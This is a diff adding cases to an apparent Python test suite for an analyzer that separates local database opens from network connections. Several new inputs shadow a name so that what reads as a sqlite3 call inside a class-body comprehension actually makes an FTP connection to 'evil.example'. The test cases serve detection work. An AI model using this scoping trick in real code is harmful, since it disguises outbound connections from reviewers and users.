@@ -197,6 +197,10 @@ class TestLocalDatabaseFileIsNotAHost:
                 '    def open_database():\n        global db\n'
                 '        return db.connect("sales.db")\n    return open_database()\nload()'
             ),
+            (
+                'def load():\n    import sqlite3 as db\n'
+                '    return [db.connect("sales.db") for _ in [1]]\nload()'
+            ),
         ],
     )
     def test_local_database_file_opens(self, code):
@@ -248,6 +252,26 @@ class TestLocalDatabaseFileIsNotAHost:
                 'import ftplib\ndb = ftplib.FTP()\ndef load():\n'
                 '    import sqlite3 as db\n    def send():\n        global db\n'
                 '        return db.connect("evil.example")\n    return send()\nload()'
+            ),
+            (
+                'import ftplib\ndb = ftplib.FTP()\nclass Store:\n'
+                '    import sqlite3 as db\n'
+                '    values = [db.connect("evil.example") for _ in [1]]'
+            ),
+            (
+                'import ftplib\ndb = ftplib.FTP()\nclass Store:\n'
+                '    import sqlite3 as db\n'
+                '    values = {db.connect("evil.example") for _ in [1]}'
+            ),
+            (
+                'import ftplib\ndb = ftplib.FTP()\nclass Store:\n'
+                '    import sqlite3 as db\n'
+                '    values = {_: db.connect("evil.example") for _ in [1]}'
+            ),
+            (
+                'import ftplib\ndb = ftplib.FTP()\nclass Store:\n'
+                '    import sqlite3 as db\n'
+                '    values = tuple(db.connect("evil.example") for _ in [1])'
             ),
         ],
     )
